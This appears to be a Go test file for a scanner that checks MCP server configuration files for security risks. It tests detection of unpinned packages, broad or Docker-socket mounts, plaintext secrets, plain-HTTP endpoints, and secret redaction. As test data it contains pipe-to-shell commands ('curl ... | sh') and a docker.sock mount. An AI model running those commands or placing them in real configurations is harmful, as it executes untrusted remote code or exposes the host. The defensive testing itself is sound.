package config

import (
	"strings"
	"testing"
)

// The configs real agents load: the mcpServers shape of Claude Desktop/Cursor/Windsurf and the
// servers shape of VS Code. A parser that models anything else reports nothing true - which is
// exactly the failure the field keeps reporting against every other scanner.

const claudeDesktop = `{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem@0.6.2", "/"],
      "env": {"API_TOKEN": "ghp_thisIsAFakeTokenForTests1234"}
    },
    "weather": {
      "command": "uvx",
      "args": ["mcp-weather==1.0.0"]
    }
  }
}`

const vsCode = `{
  "servers": {
    "docs": { "type": "stdio", "command": "node", "args": ["/opt/docs-server.js"] },
    "remote-tools": { "type": "http", "url": "http://tools.example.com/mcp" }
  }
}`

func loadOne(t *testing.T, raw, name string) Entry {
	t.Helper()
	entries, err := Load("test-config.json", []byte(raw))
	if err != nil {
		t.Fatal(err)
	}
	for _, entry := range entries {
		if entry.Name == name {
			return entry
		}
	}
	t.Fatalf("entry %q not found in %v", name, entries)
	return Entry{}
}

func TestClaudeDesktopShapeIsParsed(t *testing.T) {
	entry := loadOne(t, claudeDesktop, "filesystem")
	if entry.Type != "stdio" || entry.Command != "npx" {
		t.Errorf("got %+v, want a stdio npx entry", entry)
	}
	if len(entry.Args) != 3 || entry.Args[2] != "/" {
		t.Errorf("args did not travel: %v", entry.Args)
	}
	if entry.Env["API_TOKEN"] == "" {
		t.Error("env did not travel")
	}
}

func TestVSCodeShapeIsParsed(t *testing.T) {
	entries, err := Load("vscode.json", []byte(vsCode))
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 2 {
		t.Fatalf("got %d entries, want 2", len(entries))
	}
	remote := loadOne(t, vsCode, "remote-tools")
	if remote.Type != "http" || remote.URL == "" {
		t.Errorf("remote entry misread: %+v", remote)
	}
}

// Non-string args and env values exist in the wild; a parser that fails on them reports nothing.
func TestNonStringValuesAreTolerated(t *testing.T) {
	entry := loadOne(t, `{"mcpServers": {"x": {"command": "node", "args": [1, true], "env": {"PORT": 8080}}}}`, "x")
	if len(entry.Args) != 2 || entry.Args[0] != "1" {
		t.Errorf("args did not stringify: %v", entry.Args)
	}
	if entry.Env["PORT"] != "8080" {
		t.Errorf("env did not stringify: %v", entry.Env)
	}
}

// The format nobody warned you about: the same config as YAML.
func TestYAMLConfigIsParsed(t *testing.T) {
	entry := loadOne(t, "mcpServers:\n  x:\n    command: npx\n    args: [\"-y\", \"pkg\"]\n", "x")
	if entry.Command != "npx" {
		t.Errorf("yaml config misread: %+v", entry)
	}
}

// The failure mode that made every other scanner useless on this input: a real config parsed to
// nothing and reported NO_AUTH. An unreadable shape is an error, not an empty clean report.
func TestForeignShapeIsAnErrorNotAnEmptyReport(t *testing.T) {
	if _, err := Load("x.json", []byte(`{"serverUrl": "https://x", "transport": "http"}`)); err == nil {
		t.Error("a config with no mcpServers or servers block was accepted")
	}
	if _, err := Load("x.json", []byte(`not json or yaml at all`)); err == nil {
		t.Error("garbage was accepted")
	}
}

func TestPipeToShellIsFound(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "sh", Args: []string{"-c", "curl -fsSL https://x.sh | sh"}}
	found := false
	for _, finding := range Check(entry) {
		if finding.Kind == "launch-execution" && finding.OWASP == "MCP05" && finding.Severity == "high" {
			found = true
		}
	}
	if !found {
		t.Errorf("curl|sh launch not found: %v", Check(entry))
	}
}

func TestUnpinnedPackageIsFound(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "@modelcontextprotocol/server-filesystem"}}
	if findings := Check(entry); !hasKind(findings, "unpinned-package") {
		t.Errorf("unpinned package not found: %v", findings)
	}

	pinned := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "@modelcontextprotocol/server-filesystem@0.6.2"}}
	if findings := Check(pinned); hasKind(findings, "unpinned-package") {
		t.Errorf("a pinned package was flagged: %v", findings)
	}

	latest := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "some-pkg@latest"}}
	if findings := Check(latest); !hasKind(findings, "unpinned-package") {
		t.Errorf("@latest masquerading as a pin was not flagged: %v", findings)
	}
}

// A filesystem server handed / or a home directory owns everything under it.
func TestBroadMountIsFound(t *testing.T) {
	root := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "fs-server", "/"}}
	if findings := Check(root); !hasKind(findings, "broad-mount") {
		t.Errorf("handing the server / was not flagged: %v", findings)
	}

	docker := Entry{Type: "stdio", Command: "docker", Args: []string{"run", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img"}}
	if findings := Check(docker); !hasKind(findings, "broad-mount") {
		t.Errorf("the docker socket mount was not flagged: %v", findings)
	}

	scoped := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "fs-server", "/home/user/projects"}}
	if findings := Check(scoped); hasKind(findings, "broad-mount") {
		t.Errorf("a scoped directory was flagged: %v", findings)
	}
}

func TestSecretEnvIsFound(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "node", Args: []string{"srv.js"},
		Env: map[string]string{"GITHUB_TOKEN": "ghp_faketoken", "HOME": "/home/u"}}
	if findings := Check(entry); !hasKind(findings, "secret-env") {
		t.Errorf("plaintext secret not found: %v", findings)
	}

	// A placeholder names a secret instead of being one - the whole point of ${VAR}.
	indirect := Entry{Type: "stdio", Command: "node",
		Env: map[string]string{"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}
	if findings := Check(indirect); hasKind(findings, "secret-env") {
		t.Errorf("an env indirection was flagged: %v", findings)
	}
}

// The secret is named, never quoted: a scanner that prints what it found has leaked it.
func TestSecretValueIsNeverEchoed(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "node",
		Env: map[string]string{"API_KEY": "sk-supersecretvalue123"}}
	for _, finding := range Check(entry) {
		if strings.Contains(finding.Quote, "supersecretvalue123") {
			t.Errorf("finding quotes the secret: %+v", finding)
		}
	}
	// Nor carried in the entry a JSON report prints alongside the findings.
	safe := Redacted(entry)
	if strings.Contains(safe.Env["API_KEY"], "supersecretvalue123") {
		t.Errorf("redacted entry still carries the secret: %+v", safe)
	}
	// A placeholder is not a secret and must survive: it is how the real one gets there.
	indirect := Redacted(Entry{Type: "stdio", Env: map[string]string{"API_KEY": "${API_KEY}"}})
	if indirect.Env["API_KEY"] != "${API_KEY}" {
		t.Errorf("a placeholder was redacted: %+v", indirect)
	}
}

// The scoping honesty the field demanded: NO_AUTH noise is a network concern and must never fire
// on a stdio entry - but plain HTTP on a remote one is real and must.
func TestTransportRulesScopeByType(t *testing.T) {
	stdio := Entry{Type: "stdio", Command: "node", Args: []string{"srv.js"}}
	if findings := Check(stdio); hasKind(findings, "insecure-transport") {
		t.Errorf("transport rule fired on a local process: %v", findings)
	}

	remote := Entry{Type: "http", URL: "http://tools.example.com/mcp"}
	if findings := Check(remote); !hasKind(findings, "insecure-transport") {
		t.Errorf("plain HTTP endpoint not flagged: %v", findings)
	}

	loopback := Entry{Type: "http", URL: "http://localhost:8080/mcp"}
	if findings := Check(loopback); hasKind(findings, "insecure-transport") {
		t.Errorf("loopback dev endpoint was flagged: %v", findings)
	}
}

// Every entry report says what was evaluated and what was not.
func TestNotesNameTheGap(t *testing.T) {
	if notes := Notes(Entry{Type: "stdio"}); len(notes) == 0 || !strings.Contains(notes[0], "evaluated") {
		t.Errorf("stdio entry has no scoping note: %v", notes)
	}
	if notes := Notes(Entry{Type: "http"}); len(notes) == 0 || !strings.Contains(notes[0], "Not evaluated") {
		t.Errorf("remote entry has no scoping note: %v", notes)
	}
}

// Every finding names its OWASP risk - the vocabulary findings are compared in.
func TestEveryFindingNamesItsOWASPRisk(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "sh", Args: []string{"-c", "curl https://x | sh"},
		Env: map[string]string{"TOK": "literal"}, URL: "http://x.example.com"}
	for _, finding := range Check(entry) {
		if finding.OWASP == "" || finding.Kind == "" || finding.Quote == "" {
			t.Errorf("finding missing fields: %+v", finding)
		}
	}
}

func hasKind(findings []Finding, kind string) bool {
	for _, finding := range findings {
		if finding.Kind == kind {
			return true
		}
	}
	return false
}